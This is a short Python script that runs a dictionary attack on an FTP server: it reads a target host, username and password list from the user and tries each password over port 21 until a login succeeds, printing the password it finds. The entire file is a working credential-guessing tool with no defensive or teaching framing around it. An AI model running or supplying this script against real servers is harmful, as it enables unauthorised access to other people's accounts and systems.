import ftplib
import bcolors

host = input("Enter the host ip address")
user = input("Enter the username")
pass_file = input("Enter the password file")
port = 21

def is_correct(password):
    server = ftplib.FTP()
    print(bcolors.ERRMSG + "Tried password",password)
    try:
        server.connect(host, port, timeout=20)
        server.login(user, password)
    except:
        return False
    else:
        print(bcolors.OKMSG + "Password Found", password)
        return True

passwords = open(pass_file).read().split("\n")
for password in passwords:
    if is_correct(password):
        break
